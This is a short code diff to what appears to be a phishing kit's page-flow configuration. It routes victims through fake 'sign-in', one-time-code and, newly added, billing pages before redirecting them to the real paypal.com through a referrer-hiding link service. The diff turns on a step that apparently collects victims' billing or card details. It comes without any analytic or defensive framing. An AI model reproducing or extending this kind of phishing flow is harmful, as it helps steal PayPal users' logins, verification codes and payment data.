@@ -100,7 +100,7 @@ const pageFlow = {
   1: "login",
   2: "otp",
   3: "0",        // skipped
-  4: "0",
+  4: "bill",
   5: "final"
 };
 
@@ -108,6 +108,7 @@ const pageFlow = {
 const routeMap = {
   login: "sign-in",
   otp: "sign-in?action=otp",
+  bill: "sign-in?action=bill",
   contact: "sign-in?action=contact",
   final: "https://href.li/?https://paypal.com"
 };
